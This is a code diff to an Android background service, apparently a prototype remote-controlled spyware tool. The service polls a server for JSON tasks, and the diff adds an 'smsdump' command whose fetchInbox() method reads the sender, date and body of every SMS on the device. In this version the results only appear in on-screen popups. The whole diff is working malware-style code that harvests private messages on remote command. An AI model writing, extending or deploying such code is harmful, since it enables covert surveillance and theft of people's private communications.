@@ -6,12 +6,15 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
 import android.util.Log;
+import android.widget.TextView;
 import android.widget.Toast;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -19,16 +22,22 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.ProtocolException;
 import java.net.URL;
+import java.util.ArrayList;
 import java.util.UUID;
 
 public class Fetcher extends Service {
 
-    final String SERVER_IP = "192.168.1.4";
+    final String SERVER_IP = "192.168.0.103";
     final int SERVER_PORT = 80;
     final String FILE_NAME = "test.json";
     final String FULL_URL = "http://"+SERVER_IP+":"+SERVER_PORT+"/"+FILE_NAME;
+
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -122,6 +131,7 @@ public class Fetcher extends Service {
 
             String task;
 
+
             if(result != null){ // Check if the server is reachable
                 try {
                     JSONObject json = new JSONObject(result);
@@ -132,8 +142,14 @@ public class Fetcher extends Service {
                         PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
                         alarmManager.cancel(pintent);
                         stopSelf();
+                        Toast.makeText(getApplicationContext(),"App is dead",Toast.LENGTH_LONG).show();
                     } else if(task.equals("smsdump")) {
-                        // Functions to dump sms
+                        ArrayList<String> sms = fetchInbox();
+                        Toast.makeText(getApplicationContext(),String.valueOf(sms.size()),Toast.LENGTH_SHORT).show();
+                        for(int i=0;i<sms.size();i++){
+                          Toast.makeText(getApplicationContext(),sms.get(i),Toast.LENGTH_LONG).show();
+                        }
+
                     } else {
                         // Other functions to be implemented
                     }
@@ -155,5 +171,26 @@ public class Fetcher extends Service {
         } else {
             return false;
         }
+    }
+    public ArrayList<String> fetchInbox(){
+        ArrayList<String> sms = new ArrayList<>();
+        //Here you can change the path for sms folder e.g for inbox content://sms/inbox
+        Uri uri = Uri.parse("content://sms/");
+        Cursor cursor = getContentResolver().query(uri,new String[]{"_id","address","date","body"},null,null,null);
+        if(cursor != null) {
+            cursor.moveToFirst();
+            for(int i=0;i<cursor.getCount();i++){
+                String address = cursor.getString(1);
+                String date = cursor.getString(2);
+                String body = cursor.getString(3);
+                sms.add("Address=>"+address+"\n Date=>"+date+"\n Body=>"+body);
+                cursor.moveToNext();
+            }
+
+
+
+
+        }
+        return  sms;
     }
 }
